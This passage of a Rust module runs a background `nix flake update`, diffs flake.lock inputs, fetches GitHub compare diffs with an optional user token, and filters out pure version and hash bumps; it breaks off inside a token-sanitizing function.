//! Speculative `nix flake update`, `flake.lock` v7 diffing, GitHub input diff
//! fetching, pure version/hash bump filtering, and post-filter file-count caps.
//!
//! This module never mutates `<repo_root>/flake.lock` until the caller
//! explicitly invokes [`FlakeUpdateResult::apply`].

use std::collections::{BTreeMap, BTreeSet};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Child, Command, Stdio};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::OnceLock;
use std::thread::{self, JoinHandle};

use anyhow::{bail, Context, Result};
use regex::Regex;
use serde::Deserialize;

/// Default flake input repositories skipped when fetching upstream diffs.
pub const DEFAULT_IGNORE_REPOS: &[&str] = &[
    "NixOS/nixpkgs",
    "DeterminateSystems/nixpkgs-weekly",
    "nix-community/nixpkgs.lib",
    "nix-community/home-manager",
    "nix-darwin/nix-darwin",
];

/// Maximum number of substantive (non-filtered) files shown expanded per input.
pub const DEFAULT_MAX_DIFF_FILES: usize = 60;

/// Cap on stderr bytes retained from a background `nix flake update` process.
const MAX_NIX_STDERR_BYTES: usize = 256 * 1024;

/// Maximum files returned by a single GitHub Compare API response before truncation.
const GITHUB_COMPARE_FILE_LIMIT: usize = 300;

/// Monotonic counter used to disambiguate temp directories and staging files.
static TEMP_COUNTER: AtomicU64 = AtomicU64::new(0);

/// Configuration controlling lockfile ignore matching and post-filter collapse thresholds.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DiffConfig {
    /// Repository identifiers (`owner/repo`, matched case-insensitively) to mark ignored.
    pub ignore_repos: Vec<String>,
    /// Collapse an input diff when more than this many non-filtered files remain.
    pub max_diff_files: usize,
}

impl Default for DiffConfig {
    fn default() -> Self {
        Self {
            ignore_repos: DEFAULT_IGNORE_REPOS
                .iter()
                .map(|repo| (*repo).to_string())
                .collect(),
            max_diff_files: DEFAULT_MAX_DIFF_FILES,
        }
    }
}

impl DiffConfig {
    /// Return `true` when `repo_id` matches any configured ignore entry (case-insensitively).
    fn is_ignored(&self, repo_id: &str) -> bool {
        self.ignore_repos
            .iter()
            .any(|ignored| ignored.eq_ignore_ascii_case(repo_id))
    }
}

/// Origin type of a locked flake input node.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum InputSource {
    /// A GitHub repository (`type = "github"`).
    GitHub { owner: String, repo: String },
    /// A tarball URL (`type = "tarball"`), including FlakeHub pinned tarballs.
    Tarball { url: String },
    /// Any other Nix flake fetcher type (e.g. `gitlab`, `git`, `path`).
    Other { kind: String },
}

/// A deduplicated revision change for one or more lockfile nodes pointing at the same input.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InputChange {
    /// Sorted lockfile node names that share this exact change.
    pub names: Vec<String>,
    /// Upstream source descriptor.
    pub source: InputSource,
    /// Canonical repository identifier (e.g. `owner/repo` or FlakeHub `org/repo`).
    pub repo_id: String,
    /// Previous locked revision, or `None` if the input was newly added.
    pub old_rev: Option<String>,
    /// New locked revision, or `None` if the input was removed.
    pub new_rev: Option<String>,
    /// Previous Unix timestamp (`locked.lastModified`), if recorded.
    pub old_last_modified: Option<i64>,
    /// New Unix timestamp (`locked.lastModified`), if recorded.
    pub new_last_modified: Option<i64>,
    /// Whether `repo_id` matched `DiffConfig::ignore_repos`.
    pub is_ignored: bool,
    /// Browser URL comparing `old_rev...new_rev`, when available.
    pub compare_url: Option<String>,
}

/// Classification of a single line inside a unified diff hunk.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum DiffLineKind {
    /// Unchanged context line (or `\ No newline at end of file`).
    Context,
    /// Added line (`+` prefix stripped).
    Added,
    /// Removed line (`-` prefix stripped).
    Removed,
}

/// One line inside a [`DiffHunk`], with the leading unified-diff marker removed.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DiffLine {
    /// Whether the line is context, added, or removed.
    pub kind: DiffLineKind,
    /// Line contents without the leading `+`, `-`, or space marker.
    pub text: String,
}

/// A single unified diff hunk (`@@ ... @@`) parsed from a patch.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DiffHunk {
    /// The `@@ -a,b +c,d @@` header line.
    pub header: String,
    /// Lines belonging to this hunk.
    pub lines: Vec<DiffLine>,
    /// `true` when every added/removed line is a pure version/hash/rev/timestamp/URL-version bump.
    pub is_pure_bump: bool,
}

/// Diff details for one changed file within an [`InputDiff`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DiffFile {
    /// Repository-relative file path.
    pub path: String,
    /// GitHub file status (`added`, `modified`, `removed`, `renamed`, etc.).
    pub status: String,
    /// Count of added lines reported by upstream.
    pub additions: usize,
    /// Count of deleted lines reported by upstream.
    pub deletions: usize,
    /// Parsed unified diff hunks (all hunks are retained for interactive toggling).
    pub hunks: Vec<DiffHunk>,
    /// Reason no patch text was available (e.g. binary file or omitted by GitHub).
    pub no_patch_reason: Option<String>,
    /// `true` when the file has at least one hunk and every hunk is a pure bump.
    pub is_filtered: bool,
    /// Number of hunks in this file marked `is_pure_bump`.
    pub hidden_hunks: usize,
}

/// Summary of a commit included in a flake input comparison.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct CommitInfo {
    /// Full commit SHA.
    pub sha: String,
    /// First line of the commit message.
    pub subject: String,
    /// Commit author name.
    pub author: String,
}

/// Fetched and filtered diff for one changed flake input.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct InputDiff {
    /// The lockfile change this diff describes.
    pub change: InputChange,
    /// Commits between `old_rev` and `new_rev`.
    pub commits: Vec<CommitInfo>,
    /// All changed files (both filtered and substantive) for interactive toggling.
    pub files: Vec<DiffFile>,
    /// Number of files with `is_filtered == true`.
    pub hidden_files: usize,
    /// Total number of hunks with `is_pure_bump == true` across all files.
    pub hidden_hunks: usize,
    /// Number of files with `is_filtered == false`.
    pub substantive_files: usize,
    /// `true` when `substantive_files > cfg.max_diff_files`.
    pub collapsed_too_large: bool,
    /// Non-fatal fetch or truncation warning/error; always paired with `change.compare_url` if any.
    pub error: Option<String>,
}

/// Completed result of a speculative `nix flake update`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct FlakeUpdateResult {
    /// Full byte contents of the candidate `flake.lock`.
    pub candidate_lock_bytes: Vec<u8>,
    /// All deduplicated input changes between the old and candidate lockfiles.
    pub changes: Vec<InputChange>,
}

impl FlakeUpdateResult {
    /// Return `true` if any flake input node changed.
    pub fn has_changes(&self) -> bool {
        !self.changes.is_empty()
    }

    /// Return references to all changed inputs that are not in the ignore list.
    pub fn reviewable_changes(&self) -> Vec<&InputChange> {
        self.changes.iter().filter(|c| !c.is_ignored).collect()
    }

    /// Atomically replace `<repo_root>/flake.lock` with [`Self::candidate_lock_bytes`].
    ///
    /// Writes to a temporary sibling file inside `repo_root`, flushes it to disk,
    /// and renames it over `flake.lock` so readers never observe a half-written file.
    ///
    /// # Arguments
    ///
    /// * `repo_root` - Repository root containing `flake.lock`
    ///
    /// # Errors
    ///
    /// Returns an error if creating, writing, syncing, or renaming the staging file fails.
    pub fn apply(&self, repo_root: &Path) -> Result<()> {
        let target = repo_root.join("flake.lock");
        let seq = TEMP_COUNTER.fetch_add(1, Ordering::Relaxed);
        let staging = repo_root.join(format!(
            ".flake.lock.nix-deploy.{}.{seq}.tmp",
            std::process::id()
        ));

        let write_result = (|| -> Result<()> {
            let mut file = std::fs::File::create(&staging)
                .with_context(|| format!("creating staging lockfile {}", staging.display()))?;
            file.write_all(&self.candidate_lock_bytes)
                .with_context(|| format!("writing staging lockfile {}", staging.display()))?;
            file.sync_all()
                .with_context(|| format!("syncing staging lockfile {}", staging.display()))?;
            std::fs::rename(&staging, &target).with_context(|| {
                format!("replacing {} with {}", target.display(), staging.display())
            })?;
            Ok(())
        })();

        if write_result.is_err() {
            let _ = std::fs::remove_file(&staging);
        }
        write_result
    }
}

/// Handle to a background `nix flake update` running against a temporary output lockfile.
///
/// Dropping this handle without finishing automatically kills the child `nix`
/// process, reaps it, and removes the temporary directory.
pub struct PendingFlakeUpdate {
    child: Option<Child>,
    stderr_handle: Option<JoinHandle<String>>,
    temp_dir: PathBuf,
    output_lock: PathBuf,
    old_lock_bytes: Vec<u8>,
    cfg: DiffConfig,
    finished: bool,
}

impl PendingFlakeUpdate {
    /// Start a speculative `nix flake update` in the background without touching
    /// `<repo_root>/flake.lock`.
    ///
    /// # Arguments
    ///
    /// * `repo_root` - Flake repository root containing `flake.nix` and `flake.lock`
    /// * `cfg` - Diff configuration applied once the update completes
    ///
    /// # Errors
    ///
    /// Returns an error if `<repo_root>/flake.lock` cannot be read, the temporary
    /// workspace cannot be created, or spawning `nix` fails.
    pub fn spawn(repo_root: &Path, cfg: DiffConfig) -> Result<Self> {
        let old_lock_path = repo_root.join("flake.lock");
        let old_lock_bytes = std::fs::read(&old_lock_path)
            .with_context(|| format!("reading {}", old_lock_path.display()))?;

        let temp_dir = create_unique_temp_dir("nix-deploy-flake-update")?;
        let reference_lock = temp_dir.join("reference.lock");
        let output_lock = temp_dir.join("output.lock");

        if let Err(err) = std::fs::write(&reference_lock, &old_lock_bytes)
            .with_context(|| format!("writing {}", reference_lock.display()))
        {
            let _ = std::fs::remove_dir_all(&temp_dir);
            return Err(err);
        }

        let mut cmd = Command::new("nix");
        cmd.args(["flake", "update", "--reference-lock-file"])
            .arg(&reference_lock)
            .arg("--output-lock-file")
            .arg(&output_lock)
            .current_dir(repo_root);

        Self::spawn_command(cmd, temp_dir, output_lock, old_lock_bytes, cfg)
    }

    /// Spawn a pre-configured command writing to `output_lock` inside `temp_dir`.
    ///
    /// Separated from [`Self::spawn`] so unit tests can exercise child killing,
    /// non-blocking polling, and cleanup without invoking network-bound `nix`.
    fn spawn_command(
        mut cmd: Command,
        temp_dir: PathBuf,
        output_lock: PathBuf,
        old_lock_bytes: Vec<u8>,
        cfg: DiffConfig,
    ) -> Result<Self> {
        let spawned = cmd
            .stdin(Stdio::null())
            .stdout(Stdio::null())
            .stderr(Stdio::piped())
            .spawn()
            .context("spawning background nix flake update");

        let mut child = match spawned {
            Ok(child) => child,
            Err(err) => {
                let _ = std::fs::remove_dir_all(&temp_dir);
                return Err(err);
            }
        };

        // Drain stderr on a dedicated thread so a verbose Nix run can never block
        // on a full OS pipe buffer while we wait or poll.
        let stderr_handle = child.stderr.take().map(|mut pipe| {
            thread::spawn(move || {
                let mut kept = Vec::new();
                let mut chunk = [0u8; 4096];
                loop {
                    match pipe.read(&mut chunk) {
                        Ok(0) | Err(_) => break,
                        Ok(n) => {
                            let remaining = MAX_NIX_STDERR_BYTES.saturating_sub(kept.len());
                            if remaining > 0 {
                                kept.extend_from_slice(&chunk[..n.min(remaining)]);
                            }
                        }
                    }
                }
                String::from_utf8_lossy(&kept).into_owned()
            })
        });

        Ok(Self {
            child: Some(child),
            stderr_handle,
            temp_dir,
            output_lock,
            old_lock_bytes,
            cfg,
            finished: false,
        })
    }

    /// Poll the background `nix flake update` without blocking.
    ///
    /// Returns `None` if the process is still running (or if the result was already
    /// taken). Returns `Some(Ok(result))` or `Some(Err(err))` once the process exits.
    pub fn try_take(&mut self) -> Option<Result<FlakeUpdateResult>> {
        if self.finished {
            return None;
        }
        let child = self.child.as_mut()?;
        match child.try_wait() {
            Ok(None) => None,
            Ok(Some(status)) => {
                self.child = None;
                self.finished = true;
                Some(self.finish_with_status(status))
            }
            Err(err) => {
                self.cleanup();
                self.finished = true;
                Some(Err(err).context("polling background nix flake update"))
            }
        }
    }

    /// Block until the background `nix flake update` finishes and return its result.
    ///
    /// # Errors
    ///
    /// Returns an error if the update was already consumed, if `nix` exits non-zero,
    /// or if reading/diffing the candidate lockfile fails.
    #[allow(dead_code)]
    pub fn wait(mut self) -> Result<FlakeUpdateResult> {
        if self.finished {
            bail!("background nix flake update result was already consumed");
        }
        let Some(mut child) = self.child.take() else {
            bail!("background nix flake update has no active child process");
        };
        self.finished = true;
        let status = match child.wait() {
            Ok(status) => status,
            Err(err) => {
                self.cleanup();
                return Err(err).context("waiting for background nix flake update");
            }
        };
        self.finish_with_status(status)
    }

    /// Kill the background `nix flake update` process (if still running) and delete
    /// all temporary files.
    pub fn cancel(mut self) {
        self.cleanup();
        self.finished = true;
    }

    /// Read the finished child's stderr and candidate lockfile, compute diffs, and clean up.
    fn finish_with_status(
        &mut self,
        status: std::process::ExitStatus,
    ) -> Result<FlakeUpdateResult> {
        let stderr = self.join_stderr();
        let outcome = (|| -> Result<FlakeUpdateResult> {
            if !status.success() {
                let detail = stderr.trim();
                if detail.is_empty() {
                    bail!("nix flake update failed ({status})");
                }
                bail!("nix flake update failed ({status}): {detail}");
            }

            // Nix may skip creating `--output-lock-file` when no inputs changed; fall back
            // to the reference lockfile bytes in that case.
            let candidate_lock_bytes = if self.output_lock.is_file() {
                std::fs::read(&self.output_lock).with_context(|| {
                    format!("reading candidate lockfile {}", self.output_lock.display())
                })?
            } else {
                self.old_lock_bytes.clone()
            };

            let old_json = std::str::from_utf8(&self.old_lock_bytes)
                .context("original flake.lock is not valid UTF-8")?;
            let new_json = std::str::from_utf8(&candidate_lock_bytes)
                .context("candidate flake.lock is not valid UTF-8")?;
            let changes = diff_lockfiles(old_json, new_json, &self.cfg)?;

            Ok(FlakeUpdateResult {
                candidate_lock_bytes,
                changes,
            })
        })();

        self.remove_temp_dir();
        outcome
    }

    fn join_stderr(&mut self) -> String {
        self.stderr_handle
            .take()
            .and_then(|handle| handle.join().ok())
            .unwrap_or_default()
    }

    fn remove_temp_dir(&self) {
        if self.temp_dir.exists() {
            let _ = std::fs::remove_dir_all(&self.temp_dir);
        }
    }

    fn cleanup(&mut self) {
        if let Some(mut child) = self.child.take() {
            let _ = child.kill();
            let _ = child.wait();
        }
        let _ = self.join_stderr();
        self.remove_temp_dir();
    }
}

// Rust's `Drop` runs automatically when `PendingFlakeUpdate` leaves scope (similar to
// Python's `__exit__` in a `with` block, but enforced unconditionally even on early returns).
impl Drop for PendingFlakeUpdate {
    fn drop(&mut self) {
        self.cleanup();
    }
}

/// Create a unique directory under `std::env::temp_dir()`.
fn create_unique_temp_dir(prefix: &str) -> Result<PathBuf> {
    let base = std::env::temp_dir();
    let pid = std::process::id();
    for _ in 0..64 {
        let seq = TEMP_COUNTER.fetch_add(1, Ordering::Relaxed);
        let candidate = base.join(format!("{prefix}-{pid}-{seq}"));
        match std::fs::create_dir(&candidate) {
            Ok(()) => return Ok(candidate),
            Err(err) if err.kind() == std::io::ErrorKind::AlreadyExists => continue,
            Err(err) => {
                return Err(err).with_context(|| {
                    format!("creating temporary directory {}", candidate.display())
                })
            }
        }
    }
    bail!(
        "could not allocate a unique temporary directory under {}",
        base.display()
    );
}

// ---------------------------------------------------------------------------
// Flake lockfile v7 parsing & diffing
// ---------------------------------------------------------------------------

#[derive(Debug, Deserialize)]
struct LockFile {
    #[serde(default)]
    nodes: BTreeMap<String, LockNode>,
    #[serde(default = "default_root_node")]
    root: String,
    #[serde(default)]
    version: Option<u64>,
}

fn default_root_node() -> String {
    "root".to_string()
}

#[derive(Debug, Deserialize)]
struct LockNode {
    #[serde(default)]
    locked: Option<LockedRef>,
    #[serde(default)]
    original: Option<OriginalRef>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
struct LockedRef {
    #[serde(rename = "type")]
    kind: Option<String>,
    owner: Option<String>,
    repo: Option<String>,
    rev: Option<String>,
    nar_hash: Option<String>,
    last_modified: Option<i64>,
    url: Option<String>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
struct OriginalRef {
    owner: Option<String>,
    repo: Option<String>,
    url: Option<String>,
}

#[derive(Debug, Clone)]
struct ParsedNode {
    source: InputSource,
    repo_id: String,
    rev: Option<String>,
    nar_hash: Option<String>,
    last_modified: Option<i64>,
}

impl ParsedNode {
    fn fingerprint(&self) -> (String, Option<String>, Option<String>) {
        (
            self.repo_id.to_ascii_lowercase(),
            self.rev.clone(),
            self.nar_hash.clone(),
        )
    }

    fn same_locked_content(&self, other: &Self) -> bool {
        self.rev == other.rev && self.nar_hash == other.nar_hash
    }
}

/// Parse two Nix `flake.lock` v7 JSON documents and return all deduplicated input changes.
///
/// Compares both direct and transitive nodes, ignores unchanged nodes (same
/// `locked.rev` and `locked.narHash`), deduplicates nodes sharing the same
/// `(repo_id, old_rev, new_rev)`, and marks inputs matching `cfg.ignore_repos`.
///
/// # Arguments
///
/// * `old_json` - Previous `flake.lock` contents
/// * `new_json` - Candidate `flake.lock` contents
/// * `cfg` - Configuration providing `ignore_repos`
///
/// # Returns
///
/// Deterministically sorted list of [`InputChange`] entries (reviewable inputs first,
/// then ignored inputs).
///
/// # Errors
///
/// Returns an error if either JSON document cannot be parsed or specifies an
/// unsupported lockfile version.
pub fn diff_lockfiles(
    old_json: &str,
    new_json: &str,
    cfg: &DiffConfig,
) -> Result<Vec<InputChange>> {
    let old_lock = parse_lockfile(old_json, "old")?;
    let new_lock = parse_lockfile(new_json, "new")?;

    let old_nodes = extract_parsed_nodes(&old_lock);
    let new_nodes = extract_parsed_nodes(&new_lock);

    let old_fingerprints: BTreeSet<(String, Option<String>, Option<String>)> =
        old_nodes.values().map(ParsedNode::fingerprint).collect();
    let new_fingerprints: BTreeSet<(String, Option<String>, Option<String>)> =
        new_nodes.values().map(ParsedNode::fingerprint).collect();

    // Keyed by `(lowercase repo_id, old_rev, new_rev)` so duplicate transitive nodes
    // pointing at the same repo transition collapse into a single InputChange.
    let mut dedup: BTreeMap<(String, Option<String>, Option<String>), InputChange> =
        BTreeMap::new();

    // Track unmatched added/removed node names to catch lockfile node renumbering
    // (e.g. `foo_2` removed and `foo_3` added for the same repo).
    let mut only_old: Vec<(&String, &ParsedNode)> = Vec::new();
    let mut only_new: Vec<(&String, &ParsedNode)> = Vec::new();

    for (name, new_node) in &new_nodes {
        if let Some(old_node) = old_nodes.get(name) {
            if !old_node.same_locked_content(new_node) {
                insert_change(&mut dedup, name, Some(old_node), Some(new_node), cfg);
            }
        } else if !old_fingerprints.contains(&new_node.fingerprint()) {
            only_new.push((name, new_node));
        }
    }

    for (name, old_node) in &old_nodes {
        if !new_nodes.contains_key(name) && !new_fingerprints.contains(&old_node.fingerprint()) {
            only_old.push((name, old_node));
        }
    }

    // Pair single-repo renumbered nodes when an unmatched old and new node share a repo_id.
    let mut used_old = vec![false; only_old.len()];
    for (new_name, new_node) in only_new {
        let paired_idx = only_old
            .iter()
            .enumerate()
            .find(|(idx, (_, old_node))| {
                !used_old[*idx] && old_node.repo_id.eq_ignore_ascii_case(&new_node.repo_id)
            })
            .map(|(idx, _)| idx);

        if let Some(idx) = paired_idx {
            used_old[idx] = true;
            let (_, old_node) = only_old[idx];
            insert_change(&mut dedup, new_name, Some(old_node), Some(new_node), cfg);
        } else {
            insert_change(&mut dedup, new_name, None, Some(new_node), cfg);
        }
    }

    for (idx, (old_name, old_node)) in only_old.into_iter().enumerate() {
        if !used_old[idx] {
            insert_change(&mut dedup, old_name, Some(old_node), None, cfg);
        }
    }

    let mut changes: Vec<InputChange> = dedup
        .into_values()
        .map(|mut change| {
            change.names.sort();
            change.names.dedup();
            change
        })
        .collect();

    changes.sort_by(|a, b| {
        a.is_ignored
            .cmp(&b.is_ignored)
            .then_with(|| a.names.first().cmp(&b.names.first()))
            .then_with(|| {
                a.repo_id
                    .to_ascii_lowercase()
                    .cmp(&b.repo_id.to_ascii_lowercase())
            })
    });

    Ok(changes)
}

fn parse_lockfile(json: &str, label: &str) -> Result<LockFile> {
    let lock: LockFile =
        serde_json::from_str(json).with_context(|| format!("parsing {label} flake.lock JSON"))?;
    if let Some(version) = lock.version.filter(|&v| v != 7) {
        bail!("unsupported {label} flake.lock version {version} (expected 7)");
    }
    Ok(lock)
}

fn extract_parsed_nodes(lock: &LockFile) -> BTreeMap<String, ParsedNode> {
    let mut out = BTreeMap::new();
    for (name, node) in &lock.nodes {
        if name == &lock.root {
            continue;
        }
        let Some(locked) = node.locked.as_ref() else {
            continue;
        };
        let (source, repo_id) = classify_source(name, locked, node.original.as_ref());
        out.insert(
            name.clone(),
            ParsedNode {
                source,
                repo_id,
                rev: locked.rev.clone(),
                nar_hash: locked.nar_hash.clone(),
                last_modified: locked.last_modified,
            },
        );
    }
    out
}

fn classify_source(
    node_name: &str,
    locked: &LockedRef,
    original: Option<&OriginalRef>,
) -> (InputSource, String) {
    let kind = locked.kind.as_deref().unwrap_or("unknown");
    match kind {
        "github" => {
            let owner = locked
                .owner
                .clone()
                .or_else(|| original.and_then(|o| o.owner.clone()))
                .unwrap_or_default();
            let repo = locked
                .repo
                .clone()
                .or_else(|| original.and_then(|o| o.repo.clone()))
                .unwrap_or_default();
            let repo_id = if !owner.is_empty() && !repo.is_empty() {
                format!("{owner}/{repo}")
            } else {
                node_name.to_string()
            };
            (InputSource::GitHub { owner, repo }, repo_id)
        }
        "tarball" => {
            let url = locked
                .url
                .clone()
                .or_else(|| original.and_then(|o| o.url.clone()))
                .unwrap_or_default();
            let repo_id = extract_repo_id_from_tarball_url(&url)
                .or_else(|| {
                    original
                        .and_then(|o| o.url.as_deref())
                        .and_then(extract_repo_id_from_tarball_url)
                })
                .unwrap_or_else(|| {
                    if url.is_empty() {
                        node_name.to_string()
                    } else {
                        url.clone()
                    }
                });
            (InputSource::Tarball { url }, repo_id)
        }
        other => {
            let repo_id = match (&locked.owner, &locked.repo) {
                (Some(owner), Some(repo)) => format!("{owner}/{repo}"),
                _ => locked
                    .url
                    .clone()
                    .or_else(|| original.and_then(|o| o.url.clone()))
                    .unwrap_or_else(|| node_name.to_string()),
            };
            (
                InputSource::Other {
                    kind: other.to_string(),
                },
                repo_id,
            )
        }
    }
}

/// Extract `owner/repo` from FlakeHub or GitHub tarball URLs when recognizable.
fn extract_repo_id_from_tarball_url(url: &str) -> Option<String> {
    let (_, host, path) = split_http_url(url)?;
    let segments: Vec<&str> = path.split('/').filter(|s| !s.is_empty()).collect();

    match (host.to_ascii_lowercase().as_str(), segments.as_slice()) {
        ("api.flakehub.com" | "flakehub.com", ["f", "pinned", owner, repo, ..])
            if !owner.is_empty() && !repo.is_empty() =>
        {
            Some(format!("{owner}/{repo}"))
        }
        ("api.flakehub.com" | "flakehub.com", ["f", owner, repo, ..])
            if *owner != "pinned" && !owner.is_empty() && !repo.is_empty() =>
        {
            Some(format!("{owner}/{repo}"))
        }
        ("github.com", [owner, repo, ..]) => Some(format!("{owner}/{repo}")),
        ("api.github.com", ["repos", owner, repo, ..]) => Some(format!("{owner}/{repo}")),
        _ => None,
    }
}

fn insert_change(
    dedup: &mut BTreeMap<(String, Option<String>, Option<String>), InputChange>,
    node_name: &str,
    old: Option<&ParsedNode>,
    new: Option<&ParsedNode>,
    cfg: &DiffConfig,
) {
    let Some(primary) = new.or(old) else {
        return;
    };
    let old_rev = old.and_then(|n| n.rev.clone());
    let new_rev = new.and_then(|n| n.rev.clone());
    let key = (
        primary.repo_id.to_ascii_lowercase(),
        old_rev.clone(),
        new_rev.clone(),
    );

    if let Some(existing) = dedup.get_mut(&key) {
        existing.names.push(node_name.to_string());
        return;
    }

    let compare_url = build_compare_url(&primary.source, old_rev.as_deref(), new_rev.as_deref());
    let is_ignored = cfg.is_ignored(&primary.repo_id);

    dedup.insert(
        key,
        InputChange {
            names: vec![node_name.to_string()],
            source: primary.source.clone(),
            repo_id: primary.repo_id.clone(),
            old_rev,
            new_rev,
            old_last_modified: old.and_then(|n| n.last_modified),
            new_last_modified: new.and_then(|n| n.last_modified),
            is_ignored,
            compare_url,
        },
    );
}

fn build_compare_url(
    source: &InputSource,
    old_rev: Option<&str>,
    new_rev: Option<&str>,
) -> Option<String> {
    let (InputSource::GitHub { owner, repo }, Some(old_rev), Some(new_rev)) =
        (source, old_rev, new_rev)
    else {
        return None;
    };
    if old_rev == new_rev {
        return None;
    }
    Some(format!(
        "https://github.com/{owner}/{repo}/compare/{old_rev}...{new_rev}"
    ))
}

// ---------------------------------------------------------------------------
// GitHub Compare API fetching
// ---------------------------------------------------------------------------

#[derive(Debug, Deserialize)]
struct GhCompareResponse {
    #[serde(default)]
    commits: Vec<GhCommit>,
    #[serde(default)]
    files: Vec<GhFile>,
}

#[derive(Debug, Deserialize)]
struct GhCommit {
    sha: String,
    commit: GhCommitDetail,
}

#[derive(Debug, Deserialize)]
struct GhCommitDetail {
    message: String,
    #[serde(default)]
    author: Option<GhAuthor>,
}

#[derive(Debug, Deserialize)]
struct GhAuthor {
    #[serde(default)]
    name: Option<String>,
}

#[derive(Debug, Deserialize)]
struct GhFile {
    filename: String,
    #[serde(default)]
    status: String,
    #[serde(default)]
    additions: usize,
    #[serde(default)]
    deletions: usize,
    #[serde(default)]
    patch: Option<String>,
}

#[derive(Debug, Deserialize)]
struct GhErrorBody {
    #[serde(default)]
    message: Option<String>,
}

/// Fetch and filter the upstream diff for a single changed flake input.
///
/// Failures (network errors, GitHub rate limits, oversized diffs, or non-GitHub
/// sources) are captured gracefully in [`InputDiff::error`] rather than panicking
/// or aborting a deploy.
///
/// # Arguments
///
/// * `change` - Flake input change to fetch
/// * `cfg` - Diff configuration providing `max_diff_files`
///
/// # Returns
///
/// An [`InputDiff`] populated with commits, filtered files, counts, and any error.
pub fn fetch_one_diff(change: &InputChange, cfg: &DiffConfig) -> InputDiff {
    let (owner, repo) = match &change.source {
        InputSource::GitHub { owner, repo } => (owner.as_str(), repo.as_str()),
        InputSource::Tarball { url } => {
            return empty_error_diff(
                change,
                format!("tarball input diff is not available via GitHub API ({url})"),
            );
        }
        InputSource::Other { kind } => {
            return empty_error_diff(
                change,
                format!("{kind} input diff is not available via GitHub API"),
            );
        }
    };

    let (Some(old_rev), Some(new_rev)) = (change.old_rev.as_deref(), change.new_rev.as_deref())
    else {
        let reason = if change.old_rev.is_none() {
            "newly added input (no previous revision to compare)"
        } else {
            "removed input (no new revision to compare)"
        };
        return empty_error_diff(change, reason.to_string());
    };

    if old_rev == new_rev {
        return empty_error_diff(
            change,
            "narHash changed while rev stayed identical; inspect upstream carefully".to_string(),
        );
    }

    if !is_safe_path_segment(owner)
        || !is_safe_path_segment(repo)
        || !is_safe_path_segment(old_rev)
        || !is_safe_path_segment(new_rev)
    {
        return empty_error_diff(
            change,
            "refusing to fetch diff with unsafe repository or revision characters".to_string(),
        );
    }

    let url = format!("https://api.github.com/repos/{owner}/{repo}/compare/{old_rev}...{new_rev}");
    match curl_github_json(&url, github_token()) {
        Ok((200, body)) => match build_input_diff_from_github_json(change, &body, cfg) {
            Ok(diff) => diff,
            Err(err) => empty_error_diff(change, format!("failed to parse GitHub compare: {err}")),
        },
        Ok((status, body)) => {
            let api_msg = serde_json::from_str::<GhErrorBody>(&body)
                .ok()
                .and_then(|parsed| parsed.message)
                .filter(|m| !m.is_empty());
            let mut msg = match api_msg {
                Some(detail) => format!("GitHub API HTTP {status}: {detail}"),
                None => format!("GitHub API HTTP {status}"),
            };
            if (status == 403 || status == 429) && github_token().is_none() {
                msg.push_str(" (set GITHUB_TOKEN or authenticate with `gh auth login`)");
            }
            empty_error_diff(change, msg)
        }
        Err(err) => empty_error_diff(change, format!("failed to fetch GitHub compare: {err}")),
    }
}

/// Fetch and filter diffs for all non-ignored entries in `changes`, preserving order.
///
/// Fetches inputs concurrently using scoped OS threads so multiple GitHub compare
/// requests complete in parallel.
///
/// # Arguments
///
/// * `changes` - Slice of lockfile changes (ignored entries are skipped automatically)
/// * `cfg` - Diff configuration providing `max_diff_files`
///
/// # Returns
///
/// One [`InputDiff`] per non-ignored change, in the same order as `changes`.
#[allow(dead_code)]
pub fn fetch_input_diffs(changes: &[InputChange], cfg: &DiffConfig) -> Vec<InputDiff> {
    let reviewable: Vec<&InputChange> = changes.iter().filter(|c| !c.is_ignored).collect();
    if reviewable.len() <= 1 {
        return reviewable
            .into_iter()
            .map(|change| fetch_one_diff(change, cfg))
            .collect();
    }

    // `thread::scope` lets worker threads borrow `&InputChange` and `&DiffConfig`
    // safely without cloning or `'static` lifetimes.
    thread::scope(|scope| {
        let handles: Vec<_> = reviewable
            .into_iter()
            .map(|change| scope.spawn(move || fetch_one_diff(change, cfg)))
            .collect();

        handles
            .into_iter()
            .map(|handle| match handle.join() {
                Ok(diff) => diff,
                Err(_) => {
                    // Should be unreachable because `fetch_one_diff` does not panic,
                    // but handle thread panic defensively without crashing the caller.
                    InputDiff {
                        change: InputChange {
                            names: Vec::new(),
                            source: InputSource::Other {
                                kind: "unknown".to_string(),
                            },
                            repo_id: String::new(),
                            old_rev: None,
                            new_rev: None,
                            old_last_modified: None,
                            new_last_modified: None,
                            is_ignored: false,
                            compare_url: None,
                        },
                        commits: Vec::new(),
                        files: Vec::new(),
                        hidden_files: 0,
                        hidden_hunks: 0,
                        substantive_files: 0,
                        collapsed_too_large: false,
                        error: Some("diff fetcher thread panicked".to_string()),
                    }
                }
            })
            .collect()
    })
}

/// Discover and cache a GitHub API token once per process.
///
/// Checks `GITHUB_TOKEN`, then `GH_TOKEN`, then `gh auth token`.
fn github_token() -> Option<&'static str> {
    static TOKEN: OnceLock<Option<String>> = OnceLock::new();
    TOKEN
        .get_or_init(|| {
            for var in ["GITHUB_TOKEN", "GH_TOKEN"] {
                if let Ok(raw) = std::env::var(var) {
                    if let Some(clean) = sanitize_token(&raw) {
                        return Some(clean);
                    }
                }
            }
            let output = Command::new("gh")
                .args(["auth", "token"])
                .stdin(Stdio::null())
                .stderr(Stdio::null())
                .output()
                .ok()?;
            if !output.status.success() {
                return None;
            }
            let raw = String::from_utf8_lossy(&output.stdout);
            sanitize_token(&raw)
        })
        .as_deref()
}

fn sanitize_token(raw: &str) -> Option<String> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return None;
    }
    // Reject whitespace, quotes, or control characters before passing via curl config.
    if trimmed
        .bytes()
